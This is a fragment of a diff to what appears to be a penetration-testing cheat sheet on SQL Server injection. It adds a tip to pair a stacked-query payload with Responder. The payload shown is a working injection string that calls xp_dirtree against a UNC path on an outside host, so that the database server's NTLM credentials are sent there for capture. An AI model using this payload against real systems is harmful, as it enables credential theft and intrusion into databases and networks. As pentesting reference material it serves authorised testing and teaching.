@@ -19,6 +19,7 @@ select * from <db-name>.dbo.<table-name>;
 ## `xp_cmdshell`
 
 ## Stacked Queries
+Use it with responder. If it is system account you f*cked up! :D
 ```
 500'; EXEC xp_dirtree '\\10.10.10.10\sharename\file';-- -
 ```
